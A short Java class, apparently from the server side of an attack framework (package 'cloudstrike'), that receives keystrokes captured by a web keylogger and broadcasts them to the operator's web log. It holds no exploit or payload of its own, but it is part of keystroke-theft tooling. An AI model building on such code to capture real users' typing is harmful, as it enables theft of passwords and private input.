package server;

import cloudstrike.KeyLogger;
import common.WebKeyloggerEvent;

import java.util.Map;

public class KeyloggerHandler implements KeyLogger.KeyloggerListener {
    protected Resources resources;
    protected String curl;

    public KeyloggerHandler(Resources r, String c) {
        this.resources = r;
        this.curl = c;
    }

    @Override
    public void slowlyStrokeMe(String from, String who, Map parameters, String id) {
        this.resources.broadcast("weblog", new WebKeyloggerEvent(this.curl, who, parameters, id));
    }
}

